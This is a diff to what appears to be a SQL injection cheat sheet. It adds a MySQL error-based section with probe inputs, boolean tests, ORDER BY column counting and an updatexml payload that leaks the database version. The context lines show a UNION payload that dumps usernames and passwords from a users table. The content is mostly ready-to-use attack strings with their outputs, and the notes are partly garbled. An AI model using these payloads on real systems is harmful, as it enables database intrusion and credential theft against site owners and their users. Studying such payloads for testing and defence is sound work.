@@ -51,3 +51,27 @@ OR you can add limit using the `limit 0,1`, `limit 1,1`, `limit 2,1`...
 `1' union Select 1,concat(username,0x3a,password),3 from users limit 2,1%23`
 
 OUTPUT: decompiler:hacktract
+
+## MYSQL Error Based
+
+find errors, and interpreter. For example:
+
+```
+1'   out: 1' limit 1'
+1/   out: error
+1*   out: error
+1--  out: no error  (Booowww)
+1-- -  out: no error
+
+Continued
+1 and true;-- -    out: no error
+1 and false;-- -   out: Invalid Input parameter
+
+1 order by 7-- -   out: error (Unknown column '7' in 'order clause')
+1 order by 5-- -   out: no error  (us have 5 columns)
+
+```
+
+### UpdateXML function
+
+`AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)--`
